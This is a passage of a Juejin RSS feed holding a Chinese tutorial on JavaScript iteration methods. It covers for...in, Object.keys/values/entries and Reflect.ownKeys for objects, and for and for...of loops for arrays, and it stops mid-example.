<li><strong>oshi-core-6.4.0.jar中文-英文对照文档.zip</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2FfileDetails%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core%26version%3D6.4.0" target="_blank" title="https://hanshuixin.org/resource/fileDetails?groupId=com.github.oshi&amp;artifactId=oshi-core&amp;version=6.4.0" ref="nofollow noopener noreferrer">hanshuixin.org/resource/fi…</a></li>
<li><strong>oshi-core 其他版本中文文档</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2F%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core" target="_blank" title="https://hanshuixin.org/resource/?groupId=com.github.oshi&amp;artifactId=oshi-core" ref="nofollow noopener noreferrer">hanshuixin.org/resource/?g…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 遍历方法详解]]></title>    <link>https://juejin.cn/post/7589919989038579775</link>    <guid>https://juejin.cn/post/7589919989038579775</guid>    <pubDate>2026-01-02T06:27:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589919989038579775" data-draft-id="7589919989038547007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 遍历方法详解"/> <meta itemprop="keywords" content="前端,JavaScript,代码规范"/> <meta itemprop="datePublished" content="2026-01-02T06:27:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="UIUV"/> <meta itemprop="url" content="https://juejin.cn/user/1036168457093483"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 遍历方法详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1036168457093483/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    UIUV
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:27:50.000Z" title="Fri Jan 02 2026 06:27:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript 遍历方法详解</h2>
<p>JavaScript 提供了多种遍历方法，每种方法都有其独特的语法结构、使用场景和注意事项。掌握这些遍历方法不仅能提高代码质量，还能使开发更加高效。本文将系统地介绍 JavaScript 中常见的遍历方法，包括对象遍历和数组遍历两大类，并分析它们的特点、适用场景及最佳实践。</p>
<h3 data-id="heading-1">对象遍历方法</h3>
<h4 data-id="heading-2">for...in 循环</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> property <span class="hljs-keyword">in</span> object) {
  <span class="hljs-comment">// 使用object[property]访问属性值</span>
}
</code></pre>
<p><strong>用法</strong>：for...in 循环用于遍历对象的所有可枚举属性，包括继承的属性。它会按顺序返回对象自身的所有可枚举属性，以及原型链上可枚举的属性，直到到达原型链的终点。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> person) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
}
<span class="hljs-comment">// 输出: name: Alice, age: 25, occupation: Engineer</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>
<p><strong>遍历继承属性</strong>：for...in 会遍历对象原型链上的属性，可能导致意外结果。</p>
</li>
<li>
<p><strong>使用 hasOwnProperty 过滤</strong>：若只需遍历对象自身的属性，应使用 hasOwnProperty 方法过滤。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> person) {
  <span class="hljs-keyword">if</span> (person.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
  }
}
</code></pre>
</li>
<li>
<p><strong>不处理 Symbol 类型属性</strong>：for...in 无法遍历 Symbol 类型的属性。</p>
</li>
<li>
<p><strong>不可枚举属性不被访问</strong>：即使属性不可枚举，for...in 也不会遍历它们。</p>
</li>
<li>
<p><strong>迭代过程中修改对象可能有问题</strong>：在循环过程中添加、删除或修改对象属性可能导致不可预测的行为。</p>
</li>
</ul>
<h4 data-id="heading-3">Object.keys() + for...of/forEach</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 结合for...of</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(object)) {
  <span class="hljs-comment">// 使用object[key]访问属性值</span>
}

<span class="hljs-comment">// 结合forEach</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(object).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-comment">// 使用object[key]访问属性值</span>
});
</code></pre>
<p><strong>用法</strong>：Object.keys () 返回对象所有可枚举的自有属性名组成的数组，结合 for...of 或 forEach 可安全遍历对象自身属性。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// for...of结合</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(person)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
}
<span class="hljs-comment">// 输出: name: Alice, age: 25, occupation: Engineer</span>

<span class="hljs-comment">// forEach结合</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(person).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[key]);
});
<span class="hljs-comment">// 同样输出三个属性值</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>仅遍历自有属性</strong>：与 for...in 不同，Object.keys () 仅遍历对象自身的可枚举属性。</li>
<li><strong>不包含 Symbol 键</strong>：Object.keys () 仅返回字符串类型的属性名。</li>
<li><strong>ESLint 推荐</strong>：许多 JavaScript 风格指南推荐使用 Object.keys () 代替 for...in 遍历数组。</li>
<li><strong>返回值是数组</strong>：Object.keys () 返回的是数组，可以像其他数组一样进行操作（如排序、过滤）。</li>
</ul>
<h4 data-id="heading-4">Object.values() + for...of/forEach</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 结合for...of</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> value <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(object)) {
  <span class="hljs-comment">// 直接使用value</span>
}

<span class="hljs-comment">// 结合forEach</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(object).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
  <span class="hljs-comment">// 直接使用value</span>
});
</code></pre>
<p><strong>用法</strong>：Object.values () 返回对象所有可枚举的自有属性值组成的数组，结合 for...of 或 forEach 可直接遍历对象属性值。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// for...of结合</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> value <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(person)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);
}
<span class="hljs-comment">// 输出: Alice, 25, Engineer</span>

<span class="hljs-comment">// forEach结合</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(person).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);
});
<span class="hljs-comment">// 同样输出三个属性值</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>仅遍历自有属性值</strong>：与 Object.keys () 类似，Object.values () 也仅遍历对象自身的可枚举属性。</li>
<li><strong>不包含键信息</strong>：无法直接获取属性名，只能访问属性值（若需键名需使用 Object.entries ()）。</li>
<li><strong>ESLint 推荐</strong>：当只需要属性值时，使用 Object.values () 比 for...in 更高效、更安全。</li>
<li><strong>返回值是数组</strong>：Object.values () 返回的是数组，支持数组的所有方法（如 map、filter）。</li>
</ul>
<h4 data-id="heading-5">Object.entries() + for...of/forEach</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 结合for...of</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(object)) {
  <span class="hljs-comment">// 同时使用key和value</span>
}

<span class="hljs-comment">// 结合forEach</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(object).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-comment">// 同时使用key和value</span>
});
</code></pre>
<p><strong>用法</strong>：Object.entries () 返回对象所有可枚举的自有属性的键值对数组，结合 for...of 或 forEach 可同时访问属性名和属性值。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// for...of结合</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(person)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Key: <span class="hljs-subst">${key}</span>, Value: <span class="hljs-subst">${value}</span>`</span>);
}
<span class="hljs-comment">// 输出: Key: name, Value: Alice; Key: age, Value: 25; Key: occupation, Value: Engineer</span>

<span class="hljs-comment">// forEach结合</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(person).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Key: <span class="hljs-subst">${key}</span>, Value: <span class="hljs-subst">${value}</span>`</span>);
});
<span class="hljs-comment">// 同样输出三个键值对</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>仅遍历自有属性</strong>：与 Object.keys () 和 Object.values () 一样，Object.entries () 也仅遍历对象自身的可枚举属性。</li>
<li><strong>返回键值对数组</strong>：每个键值对以数组形式返回，索引 0 为键，索引 1 为值，支持数组解构赋值。</li>
<li><strong>ESLint 推荐</strong>：当需要同时访问键和值时，Object.entries () 是比 for...in 更安全的选择。</li>
<li><strong>返回值是数组</strong>：Object.entries () 返回的是数组，可结合数组方法进行复杂操作。</li>
</ul>
<h4 data-id="heading-6">Reflect.ownKeys()</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(object);
</code></pre>
<p><strong>用法</strong>：Reflect.ownKeys () 返回对象所有自有属性（包括不可枚举属性和 Symbol 类型的属性）的键集合，是遍历对象所有属性的最全面方法。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">occupation</span>: <span class="hljs-string">'Engineer'</span>
};

<span class="hljs-comment">// 添加不可枚举属性</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person, <span class="hljs-string">'id'</span>, {
  <span class="hljs-attr">value</span>: <span class="hljs-number">1001</span>,
  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// 不可枚举</span>
});

<span class="hljs-comment">// 添加Symbol类型属性</span>
person[<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'secret'</span>)] = <span class="hljs-string">'abc123'</span>;

<span class="hljs-keyword">const</span> allKeys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(person);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allKeys); 
<span class="hljs-comment">// 输出: ['name', 'age', 'occupation', 'id', Symbol(secret)]</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>包含所有自有属性</strong>：包括可枚举和不可枚举的属性，不受 enumerable 属性影响。</li>
<li><strong>支持 Symbol 类型的键</strong>：与 Object.keys () 不同，Reflect.ownKeys () 可以返回 Symbol 类型的键。</li>
<li><strong>不遍历继承属性</strong>：仅遍历对象自身的属性，不包含原型链上的属性。</li>
<li><strong>返回数组</strong>：返回一个包含所有自有属性键的数组，可以像其他数组一样进行操作。</li>
<li><strong>性能考量</strong>：相比 Object.keys ()，Reflect.ownKeys () 可能稍慢，因为需要处理更多类型的键（不可枚举、Symbol）。</li>
</ul>
<h4 data-id="heading-7">其他自有属性方法</h4>
<p>JavaScript 还提供了其他几种遍历对象自有属性的方法，适用于特定场景：</p>
<h5 data-id="heading-8">1. Object.getOwnPropertyNames()</h5>
<ul>
<li>
<p><strong>语法</strong>：<code>Object.getOwnPropertyNames(object)</code></p>
</li>
<li>
<p><strong>用法</strong>：返回对象所有自有属性名（包括不可枚举的）的数组，但不包含 Symbol 类型的键。</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person, <span class="hljs-string">'id'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span> });

<span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(person);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(keys); <span class="hljs-comment">// 输出: ['name', 'age', 'id']</span>
</code></pre>
</li>
</ul>
<h5 data-id="heading-9">2. Object.getOwnPropertySymbols()</h5>
<ul>
<li>
<p><strong>语法</strong>：<code>Object.getOwnPropertySymbols(object)</code></p>
</li>
<li>
<p><strong>用法</strong>：返回对象所有自有 Symbol 类型属性名的数组，仅包含 Symbol 类型的键。</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'secret'</span>)]: <span class="hljs-string">'abc123'</span>
};

<span class="hljs-keyword">const</span> symbols = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(person);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(symbols); <span class="hljs-comment">// 输出: [Symbol(secret)]</span>
</code></pre>
</li>
</ul>
<h5 data-id="heading-10">3. for...in 循环 + hasOwnProperty</h5>
<ul>
<li>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> object) {
  <span class="hljs-keyword">if</span> (object.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-comment">// 处理属性</span>
  }
}
</code></pre>
</li>
<li>
<p><strong>用法</strong>：通过 hasOwnProperty 过滤继承属性，仅遍历对象自身的属性，是 for...in 的安全用法。</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};

<span class="hljs-comment">// 给原型添加属性（继承属性）</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">gender</span> = <span class="hljs-string">'female'</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> person) {
  <span class="hljs-keyword">if</span> (person.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${person[key]}</span>`</span>);
  }
}
<span class="hljs-comment">// 输出: name: Alice, age: 25（过滤了gender属性）</span>
</code></pre>
</li>
</ul>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>性能差异</strong>：Object.getOwnPropertyNames () 和 Object.getOwnPropertySymbols () 相比 Object.keys () 会返回更多属性，但性能略低。</li>
<li><strong>适用场景</strong>：当需要遍历所有自有属性（包括不可枚举的）时，使用这些方法；当仅需可枚举属性时，优先使用 Object.keys ()/values ()/entries ()。</li>
<li><strong>Symbol 键的特殊性</strong>：Symbol 类型的键不会被 for...in、Object.keys () 等方法捕获，需使用 Reflect.ownKeys () 或 Object.getOwnPropertySymbols () 专门处理。</li>
</ul>
<h3 data-id="heading-11">数组遍历方法</h3>
<h4 data-id="heading-12">传统 for 循环</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; array.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-comment">// 使用array[i]访问元素</span>
}
</code></pre>
<p><strong>用法</strong>：传统 for 循环是最基础的数组遍历方式，通过索引控制循环流程，支持灵活的循环控制（break、continue、return）。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 遍历数组并打印元素</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Index <span class="hljs-subst">${i}</span>: <span class="hljs-subst">${numbers[i]}</span>`</span>);
}
<span class="hljs-comment">// 输出: Index 0: 1; Index 1: 2; ...; Index 4: 5</span>

<span class="hljs-comment">// 遍历数组并修改元素</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  numbers[i] = numbers[i] * <span class="hljs-number">2</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers); <span class="hljs-comment">// 输出: [2, 4, 6, 8, 10]</span>

<span class="hljs-comment">// 中断循环（找到第一个偶数）</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">if</span> (numbers[i] % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`第一个偶数: <span class="hljs-subst">${numbers[i]}</span>`</span>);
    <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>
<p><strong>完全控制循环</strong>：支持 break（中断循环）、continue（跳过当前迭代）、return（退出函数）等控制语句。</p>
</li>
<li>
<p><strong>可修改原数组</strong>：通过索引直接访问元素，可直接修改原数组的值。</p>
</li>
<li>
<p><strong>性能最佳</strong>：在大型数组遍历中，传统 for 循环的性能通常优于 forEach、map 等方法（减少函数调用开销）。</p>
</li>
<li>
<p><strong>索引管理</strong>：需要手动管理索引变量（i 的初始化、条件判断、递增），容易出现索引错误（如数组越界）。</p>
</li>
<li>
<p><strong>缓存数组长度</strong>：对于长度固定的数组，可缓存 length 属性以提高性能：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> len = numbers.<span class="hljs-property">length</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
  <span class="hljs-comment">// 处理逻辑</span>
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-13">for...of 循环</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> element <span class="hljs-keyword">of</span> array) {
  <span class="hljs-comment">// 直接使用element</span>
}
</code></pre>
<p><strong>用法</strong>：for...of 循环是 ES6 引入的遍历可迭代对象（数组、字符串、Map、Set 等）的方法，直接遍历元素值，无需索引。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 遍历数组元素</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> num <span class="hljs-keyword">of</span> numbers) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);
}
<span class="hljs-comment">// 输出: 1, 2, 3, 4, 5</span>

<span class="hljs-comment">// 遍历数组并获取索引（结合Array.prototype.entries()）</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [index, num] <span class="hljs-keyword">of</span> numbers.<span class="hljs-title function_">entries</span>()) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Index <span class="hljs-subst">${index}</span>: <span class="hljs-subst">${num}</span>`</span>);
}
